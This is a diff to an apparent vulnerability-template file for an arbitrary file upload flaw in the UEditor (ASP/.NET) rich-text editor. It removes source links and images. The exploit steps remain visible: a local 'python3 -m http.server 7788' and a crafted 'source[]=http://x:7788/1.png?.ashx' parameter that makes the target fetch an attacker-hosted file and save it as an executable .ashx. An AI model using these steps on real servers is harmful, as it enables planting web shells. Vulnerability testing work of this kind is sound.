@@ -3,17 +3,11 @@ info:
   name: ueditor存在任意文件上传漏洞(ASP)
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gbuaukv30272380r'
+  description: ''
   tags: file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gbuaukv30272380r
-    fofa: 暂无
 http:
 - raw:
-  - '![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1739187749248-8dd88954-3996-40c5-9065-1dad2b48b254.png)
-
-    Ueditor路径：
+  - 'Ueditor路径：
 
     /ueditor/
 
@@ -74,7 +68,6 @@ http:
 
     python3 -m http.server 7788
 
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1739187749468-77a8d903-cad7-42c5-9230-03a758bce494.png)
 
     发送如下请求包
 
@@ -99,11 +92,8 @@ http:
 
     source[]=http://x:7788/1.png?.ashx
 
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1739187749672-6031ab04-c01d-4722-9586-1cb9c3b048af.png)
 
-    /ueditor/net/upload/image/20240712/6385635362820339411030114.ashx
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1739187749887-f3d50061-0254-4c63-b790-ce65e3fd1148.png)'
+    /ueditor/net/upload/image/20240712/6385635362820339411030114.ashx'
   redirects: false
   matchers:
   - status:
